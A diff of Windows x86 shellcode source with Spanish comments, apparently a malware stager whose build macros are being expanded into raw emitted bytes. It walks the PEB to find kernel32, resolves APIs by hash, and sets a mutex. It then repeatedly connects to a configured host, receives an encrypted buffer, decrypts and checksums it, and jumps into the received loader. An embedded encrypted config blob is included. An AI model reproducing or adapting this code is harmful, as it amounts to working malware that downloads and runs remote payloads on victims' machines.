@@ -6,7 +6,7 @@
 **    ¡¡¡EDITAR 'macros.h' PARA SELECCIONAR LA COMPILACIÓN CONDICIONADA!!!
 *###############################################################################*/
 #include "macros.h"
-INCLUDE_PYSRC(..\..\builder\intrabuilder.py)
+INCLUDE_PYSRC(..\builder\intrabuilder.py)
 
 #define API_DEFINE(...) PYTHON_FUNCTION()
 #define VAR_DEFINE(...) PYTHON_FUNCTION()
@@ -85,7 +85,7 @@ find_delta:
         */
         fldln2
 #ifdef SC_DELTA
-        _EMIT_ARRAY([0xD9, 0x74, 0x24, 0xF4])
+       __asm _emit(217)__asm _emit(116)__asm _emit(36)__asm _emit(244)
         pop  edi
         #ifdef SC_NULL
         add  edi, K
@@ -93,7 +93,11 @@ find_delta:
         #else //SC_NULL
         sub  edi, find_delta
         #endif //SC_NULL
-        DEBUG_MSG("sDELTA", ["edi"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push edi}__asm{push sDELTA}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
 #endif //SC_DELTA
 
         //Saltamos los hashes y funciones.
@@ -112,52 +116,52 @@ find_delta:
 #pragma region hashes
 kernel32_symbol_hashes:
         #define kernel32_count  13
-        API_DEFINE("LoadLibraryA")
-        API_DEFINE("Sleep")
-        API_DEFINE("ExitProcess")
-        API_DEFINE("LocalAlloc")
-        API_DEFINE("VirtualAlloc")
-        API_DEFINE("CreateMutexA")
-        API_DEFINE("GetTempFileNameA")
-        API_DEFINE("CopyFileA")
-        API_DEFINE("DeleteFileW")
-        API_DEFINE("WinExec")
-        API_DEFINE("CreateFileA")
-        API_DEFINE("ReadFile")
-        API_DEFINE("SetFilePointer")
+       enum {_LoadLibraryA = 0-STACK_OFFSET};__asm _emit(20)__asm _emit(48)
+       enum {_Sleep = 4-STACK_OFFSET};__asm _emit(121)__asm _emit(6)
+       enum {_ExitProcess = 8-STACK_OFFSET};__asm _emit(45)__asm _emit(47)
+       enum {_LocalAlloc = 12-STACK_OFFSET};__asm _emit(64)__asm _emit(15)
+       enum {_VirtualAlloc = 16-STACK_OFFSET};__asm _emit(96)__asm _emit(11)
+       enum {_CreateMutexA = 20-STACK_OFFSET};__asm _emit(196)__asm _emit(42)
+       enum {_GetTempFileNameA = 24-STACK_OFFSET};__asm _emit(144)__asm _emit(59)
+       enum {_CopyFileA = 28-STACK_OFFSET};__asm _emit(100)__asm _emit(11)
+       enum {_DeleteFileW = 32-STACK_OFFSET};__asm _emit(36)__asm _emit(3)
+       enum {_WinExec = 36-STACK_OFFSET};__asm _emit(141)__asm _emit(50)
+       enum {_CreateFileA = 40-STACK_OFFSET};__asm _emit(225)__asm _emit(17)
+       enum {_ReadFile = 44-STACK_OFFSET};__asm _emit(48)__asm _emit(12)
+       enum {_SetFilePointer = 48-STACK_OFFSET};__asm _emit(37)__asm _emit(55)
 
 ws2_32_symbol_hashes:
         #define ws2_32_count    7
-        API_DEFINE("WSASocketA")
-        API_DEFINE("connect")
-        API_DEFINE("WSAStartup")
-        API_DEFINE("closesocket")
-        API_DEFINE("inet_addr")
-        API_DEFINE("gethostbyname")
-        API_DEFINE("recv")
+       enum {_WSASocketA = 52-STACK_OFFSET};__asm _emit(9)__asm _emit(52)
+       enum {_connect = 56-STACK_OFFSET};__asm _emit(104)__asm _emit(35)
+       enum {_WSAStartup = 60-STACK_OFFSET};__asm _emit(108)__asm _emit(31)
+       enum {_closesocket = 64-STACK_OFFSET};__asm _emit(185)__asm _emit(53)
+       enum {_inet_addr = 68-STACK_OFFSET};__asm _emit(88)__asm _emit(34)
+       enum {_gethostbyname = 72-STACK_OFFSET};__asm _emit(224)__asm _emit(57)
+       enum {_recv = 76-STACK_OFFSET};__asm _emit(48)__asm _emit(5)
 
 advapi32_symbol_hashes:
         #define advapi32_count	4
-        API_DEFINE("CryptAcquireContextA")
-        API_DEFINE("CryptSetKeyParam")
-        API_DEFINE("CryptImportKey")
-        API_DEFINE("CryptDecrypt")
+       enum {_CryptAcquireContextA = 80-STACK_OFFSET};__asm _emit(68)__asm _emit(18)
+       enum {_CryptSetKeyParam = 84-STACK_OFFSET};__asm _emit(240)__asm _emit(24)
+       enum {_CryptImportKey = 88-STACK_OFFSET};__asm _emit(48)__asm _emit(41)
+       enum {_CryptDecrypt = 92-STACK_OFFSET};__asm _emit(9)__asm _emit(2)
 #pragma endregion
 
 #pragma region VARS
-        VAR_DEFINE("CommandLine")
-        VAR_DEFINE("APPDATA")
-        VAR_DEFINE("DAT_NFO")
-        VAR_DEFINE("pHOST")
-        VAR_DEFINE("pKEY")
-        VAR_DEFINE("pMUTEX")
-        VAR_DEFINE("hProv")
-        VAR_DEFINE("hKey")
-        VAR_DEFINE("hSocket")
-        VAR_DEFINE("pBuff")
-        VAR_DEFINE("buffLen")
-        VAR_DEFINE("TARGETS")
-        VAR_DEFINE("PORT")
+       enum {_CommandLine = 96-STACK_OFFSET};
+       enum {_APPDATA = 100-STACK_OFFSET};
+       enum {_DAT_NFO = 104-STACK_OFFSET};
+       enum {_pHOST = 108-STACK_OFFSET};
+       enum {_pKEY = 112-STACK_OFFSET};
+       enum {_pMUTEX = 116-STACK_OFFSET};
+       enum {_hProv = 120-STACK_OFFSET};
+       enum {_hKey = 124-STACK_OFFSET};
+       enum {_hSocket = 128-STACK_OFFSET};
+       enum {_pBuff = 132-STACK_OFFSET};
+       enum {_buffLen = 136-STACK_OFFSET};
+       enum {_TARGETS = 140-STACK_OFFSET};
+       enum {_PORT = 144-STACK_OFFSET};
 #pragma endregion
 
 //¡¡¡¡CONSTANTES TEMPORALES!!!!
@@ -191,7 +195,11 @@ load_next_target:
 #ifdef DEBUG
         bswap eax
         shr   eax, 16
-        DEBUG_MSG("sTARGET", ["esi", "eax"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push eax}__asm{push esi}__asm{push sTARGET}__asm{call printf}__asm{add esp, 12}__asm{popad}
+#endif
+
         shl   eax, 16
         bswap eax
 #endif
@@ -229,7 +237,11 @@ CreateBuff:
         pushc(1024)
         push LPTR                       //v
         call [ebp+_LocalAlloc]          //>VirtualAlloc(LPTR, SIZE)
-        DEBUG_MSG("sBUFFER", ["eax"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push eax}__asm{push sBUFFER}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
 #ifdef ERR_CHECK
         push ERR_MEM                    //v
         call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
@@ -262,7 +274,7 @@ HOST2:  EMIT_BYTE_ARRAY(('l') ('o') ('c') ('a') ('l') ('h') ('o') ('s') ('t')(0)
         EMIT_DWORD(0)
         */
 
-        MY_CONFIG( )
+       __asm _emit(164)__asm _emit(123)__asm _emit(207)__asm _emit(209)__asm _emit(249)__asm _emit(113)__asm _emit(114)__asm _emit(177)__asm _emit(188)__asm _emit(121)__asm _emit(207)__asm _emit(209)__asm _emit(148)__asm _emit(31)__asm _emit(41)__asm _emit(215)__asm _emit(119)__asm _emit(175)__asm _emit(252)__asm _emit(224)__asm _emit(4)__asm _emit(151)__asm _emit(171)__asm _emit(196)__asm _emit(245)__asm _emit(149)__asm _emit(247)__asm _emit(213)__asm _emit(164)__asm _emit(99)__asm _emit(23)__asm _emit(208)__asm _emit(192)__asm _emit(13)__asm _emit(167)__asm _emit(209)__asm _emit(220)__asm _emit(132)__asm _emit(67)__asm _emit(131)__asm _emit(155)__asm _emit(87)__asm _emit(255)__asm _emit(255)__asm _emit(199)__asm _emit(57)__asm _emit(67)__asm _emit(177)__asm _emit(172)__asm _emit(121)__asm _emit(207)__asm _emit(209)__asm _emit(247)__asm _emit(23)__asm _emit(114)__asm _emit(177)
 
         //EMIT_BYTE_ARRAY((0xA4)(0x7B)(0xCF)(0xD1)(0xF9)(0x71)(0x72)(0xB1)(0xBC)(0x79)(0xCF)(0xD1)(0x94)(0x1F)(0x29)(0xD7)(0x77)(0xAF)(0xFC)(0xE0)(0x4)(0x97)(0xAB)(0xC4)(0xF5)(0x95)(0xF7)(0xD5)(0xA4)(0x63)(0x17)(0xD0)(0xC0)(0xD)(0xA7)(0xD1)(0xDC)(0x84)(0x6)(0xC3)(0xC3)(0x15)(0xA0)(0xBD)(0x98)(0x39)(0x11)(0xDE)(0xC1)(0x79)(0xE4)(0x42)(0xC6)(0x25)(0x45)(0x9F)(0x9C)(0x57)(0xFF)(0xFF)(0xC6)(0x17)(0x72)(0xB1)(0xAC)(0x79)(0xCF)(0xD1)(0xF7)(0x17)(0x72)(0xB1)(0xAC)(0x79)(0xCF)(0xD1))
 
@@ -278,7 +290,7 @@ to_start:
         **    Utilizaremos durante todo el código EBP como puntero al inicio de este
         **    'stack de direcciones'
         *###############################################################################*/
-        add  esp, - STACKSIZE( )
+        add  esp, -144
         lea  ebp, [esp+STACK_OFFSET]
 #ifdef SC_DELTA
         push edi                        //Guardamos el Delta
@@ -321,7 +333,11 @@ appdata_found:
 
         //ESI = &APPDATA
         mov  [ebp+_APPDATA], esi        //Almacenamos el puntero a APPDATA (UNICODE)
-        DEBUG_MSG("sAPPDATA", ["esi"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push esi}__asm{push sAPPDATA}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
         pop  esi                        //ESI = PEB->Ldr
         mov  esi, [esi+0x1C]            //ESI = PEB->Ldr.InInitOrder[0]
 next_module:
@@ -340,41 +356,77 @@ find_kernel32_finished:
 
         sub  ebp, STACK_OFFSET          //Apuntamos al inicio de Stack
         //Cargamos las APIs de kernel32 en la pila a partir de los hashes
-        DEBUG_MSG("sCK32", ["kernel32_count"])
-        DEBUG_MSG("sADDR", ["eax"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push kernel32_count}__asm{push sCK32}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push eax}__asm{push sADDR}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
         push kernel32_count             //v Número de hashes de kernel32
         call edi                        //>LoadFunctions(kernel32_count);
         mov  ebx, [ebp-(kernel32_count*4)+_LoadLibraryA+STACK_OFFSET]//EBX = &LoadLibraryA
-        DEBUG_MSG("sOK")
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push sOK}__asm{call printf}__asm{add esp, 4}__asm{popad}
+#endif
+
 
         //Obtenemos la BaseAddress de ws2_32
         pushc('23')                     //v
         pushc('_2sw')                   //v Metemos el nombre del API en el stack (ANSI)
-        DEBUG_MSG("sCW32", ["ws2_32_count"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push ws2_32_count}__asm{push sCW32}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
         push esp                        //v
         call ebx                        //>LoadLibraryA("ws2_32");
-        DEBUG_MSG("sADDR", ["eax"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push eax}__asm{push sADDR}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
         pop  edx                        //v
         pop  edx                        //>Restauramos la pila sacando la cadena ANSI
         
         //Cargamos las APIs de ws2_32 en la pila a partir de los hashes
         push ws2_32_count               //v Número de hashes de ws2_32
         call edi                        //>LoadFunctions(ws2_32_count);
-        DEBUG_MSG("sOK")
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push sOK}__asm{call printf}__asm{add esp, 4}__asm{popad}
+#endif
+
         //Obtenemos el BaseAddress de advapi32
         cdq                             //EDX = 0
         push edx                        //v
         pushc('23ip')                   //v Metemos el nombre del API en el stack (ANSI)
         pushc('avda')                   //v
-        DEBUG_MSG("sCA32", ["advapi32_count"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push advapi32_count}__asm{push sCA32}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
         push esp                        //v
         call ebx                        //>LoadLibraryA("advapi32");
-        DEBUG_MSG("sADDR", ["eax"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push eax}__asm{push sADDR}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
         add  esp, 0xC                   //Restauramos la pila eliminando la cadena ANSI
 
         push advapi32_count             //v Número de hashes de advapi32
         call edi                        //>LoadFunctions(advapi32_count);
-        DEBUG_MSG("sOK")
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push sOK}__asm{call printf}__asm{add esp, 4}__asm{popad}
+#endif
+
         add  esp, 0xC                   //Reparamos el stack después de las llamadas a LoadFunctions()
 #ifdef SC_DELTA
         pop  edi                        //Recuperamos el Delta
@@ -422,7 +474,11 @@ xornext:
         /*###############################################################################
         **                          Comprobación del Mutex
         *###############################################################################*/
-        DEBUG_MSG("sMTX", ["[ebp+_pMUTEX]"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push [ebp+_pMUTEX]}__asm{push sMTX}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
         cdq                             //EDX = 0
         push [ebp+_pMUTEX]              //v
         push edx                        //v
@@ -438,7 +494,11 @@ xornext:
 #else //ERR_CHECK
         test eax, eax
         jz  nomtx
-        DEBUG_MSG("sERR")
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push sERR}__asm{call printf}__asm{add esp, 4}__asm{popad}
+#endif
+
         push ERR_MTX
         call [ebp+_ExitProcess]
 nomtx:
@@ -558,7 +618,11 @@ found:
         call copy_uni_to_ascii_filter
         mov  DWORD PTR[edi-4], 'tad.'   //Cambiamos la extensión a .dat
 
-        DEBUG_MSG("sOFFLINE", ["edi"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push edi}__asm{push sOFFLINE}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
 
         cdq                             //EDX = 0
         push edx                        //v
@@ -618,7 +682,11 @@ newSocket:
         call [ebp+_WSASocketA]          //>WSASocketA(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
         mov  [ebp+_hSocket], eax        //hSocket = EAX
 
-        DEBUG_MSG("sNEWSOCKT", ["eax"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push eax}__asm{push sNEWSOCKT}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
 
         jmp  connect_loop
 sleep_and_loop:
@@ -658,7 +726,11 @@ do_the_loop:
 #endif //SC_NULL
         call [ebp+_Sleep]               //Sleep(0x3F8);
 connect_loop:
-        DEBUG_MSG("sCON", ["[ebp+_pHOST]"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push [ebp+_pHOST]}__asm{push sCON}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
         //Obtenemos la dirección válida
         push [ebp+_pHOST]               //v
         call [ebp+_gethostbyname]       //>gethostbyname(&HOST);
@@ -684,7 +756,11 @@ connect_loop:
         test eax, eax                   //v
         jl   sleep_and_loop             //>(EAX<0)? (Error, reseteemos)
 connected:
-        DEBUG_MSG("sOK")
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push sOK}__asm{call printf}__asm{add esp, 4}__asm{popad}
+#endif
+
         /*###############################################################################
         ** Recepción de datos desde el cliente:
         **  Una vez establecida la conexión con éxito intentamos recibir 
@@ -712,7 +788,11 @@ recibir:
         cmp  eax, 0x7F                  //> Suficientes Bytes para no generar problemas
         jg   init_decrypt               //>EAX>7F? (Todo correcto? Procedemos a descifrar)
 KillSocket:
-        DEBUG_MSG("sRESET")
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push sRESET}__asm{call printf}__asm{add esp, 4}__asm{popad}
+#endif
+
         push [ebp+_hSocket]             //v
 #ifdef SC_NULL
         mov  eax, ebp
@@ -730,8 +810,16 @@ KillSocket:
         *###############################################################################*/
 
 init_decrypt:
-        DEBUG_MSG("sRECV", ["eax"])
-        DEBUG_MSG("sICRYPT")
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push eax}__asm{push sRECV}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push sICRYPT}__asm{call printf}__asm{add esp, 4}__asm{popad}
+#endif
+
         //Adquirimos el handle para trabajar con el CSP deseado.
         cdq                             //EDX = 0
 #ifdef SC_NULL
@@ -787,7 +875,11 @@ init_decrypt:
         push [ebp+_hKey]                //v
         call [ebp+_CryptDecrypt]        //>CryptDecrypt(hKey, 0, True, 0, pBuff, &buffLen);
 
-        DEBUG_MSG("sECRYPT")
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push sECRYPT}__asm{call printf}__asm{add esp, 4}__asm{popad}
+#endif
+
 
         pop  edx                        //Descartamos la variable temporal
         pop  ecx                        //Recuperamos SizeOfPayload+4
@@ -805,7 +897,11 @@ init_decrypt:
         sub  ecx, 4                     //ECX = SizePayload
         mov  ebx, [esi]                 //EBX = CheckSum
 
-        DEBUG_MSG("sHASH", ["ecx", "ebx"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push ebx}__asm{push ecx}__asm{push sHASH}__asm{call printf}__asm{add esp, 12}__asm{popad}
+#endif
+
 
         add  esi, 4                     //ESI+= 4 (saltamos checksum)
         cdq                             //hash = 0
@@ -818,14 +914,22 @@ FNV1a:
         cmp  edx, ebx
         jne  KillSocket                 //>(EDX==checksum?)
 
-        DEBUG_MSG("sOK")
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push sOK}__asm{call printf}__asm{add esp, 4}__asm{popad}
+#endif
+
 
         push [ebp+_hKey]                //v
         push [ebp+_hSocket]             //v
         push [ebp+_LoadLibraryA]        //v
         mov  eax, [ebp+_pBuff]          //v
         add  eax, 0x14                  // Saltamos hasta el loader
-        DEBUG_MSG("sEJEC", ["eax"])
+       
+#ifdef DEBUG
+__asm{pushad}__asm{push eax}__asm{push sEJEC}__asm{call printf}__asm{add esp, 8}__asm{popad}
+#endif
+
         call eax                        //>loader(&LoadLibraryA, hSocket, &KEY);
 
         //En caso de que haya habido algún error no crítico el loader me devuelve la ejecución
